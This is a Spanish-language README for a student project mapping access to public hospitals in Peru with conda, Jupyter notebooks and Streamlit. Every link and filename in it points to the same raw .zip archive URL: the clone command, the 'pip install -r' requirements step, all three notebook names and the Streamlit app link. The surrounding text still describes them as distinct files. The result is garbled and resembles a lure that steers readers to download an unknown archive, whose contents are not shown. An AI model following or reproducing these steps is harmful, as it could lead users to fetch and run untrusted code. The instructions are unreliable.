
# Assignment 2: Geospatial Analysis of Hospitals in Peru

Este proyecto realiza un análisis geoespacial para evaluar la distribución y el acceso a los establecimientos de salud públicos en Perú. Utilizando datos del MINSA (IPRESS) y del INEI (Centros Poblados), se generan mapas estáticos y dinámicos para visualizar la cobertura a nivel distrital y departamental.

-----

## **Requisitos** 

  * **Conda**: El gestor de paquetes y entornos.
  * **Python 3.9** o superior.

-----

## **Instalación y Configuración con Conda** 

Para poner en marcha este proyecto en tu entorno local, sigue estos pasos desde tu terminal:

1.  **Clona el Repositorio**

    ```bash
    git clone [https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip]
    cd [Hospitals-Access-Peru]
    ```

2.  **Crea y Activa el Entorno de Conda**
    Este comando creará un nuevo entorno llamado `streamlit` con Python 3.9.

    ```bash
    # Crear el entorno
    conda create --name streamlit python=3.9 -y

    # Activar el entorno
    conda activate streamlit
    ```

3.  **Instala las Dependencias**
    Este comando leerá el archivo `https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip` e instalará todas las librerías necesarias dentro de tu entorno `streamlit`.

    ```bash
    pip install -r https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip
    ```

-----

## **Ejecución del Análisis** 

El análisis completo está dividido en tres notebooks de Jupyter. Para asegurar que el flujo de datos sea correcto, **debes ejecutarlos en el siguiente orden**. Recuerda tener siempre tu entorno `streamlit` activado.

1.  **`https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip`**
    * **Contenido**: Realiza la carga, limpieza y preparación inicial de los datos de hospitales y distritos.
    * **Análisis**: Genera los mapas estáticos y el análisis a nivel de distrito y departamento.

2.  **`https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip`**
    * **Contenido**: Carga los datos procesados del notebook anterior y los datos de centros poblados.
    * **Análisis**: Ejecuta el análisis de proximidad de 10 km para Lima y Loreto.

3.  **`https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip`**
    * **Contenido**: Utiliza todos los datos y análisis generados previamente.
    * **Análisis**: Crea los mapas interactivos finales con Folium, incluyendo el coroplético nacional y los mapas de proximidad, dejando todo listo para la aplicación.
  
-----
Document in the README how hospitals were filtered for “functioning status”: Luego de revisar la data, se identificó que los hospitales en funcionamiento tenían el valor "EN FUNCIONAMIENTO" en la variable "Condición". Por ello se usó data = data[data["Condición"] == "EN FUNCIONAMIENTO"] para filtrarlos.

-----
Link del Streamlit publicado: https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip
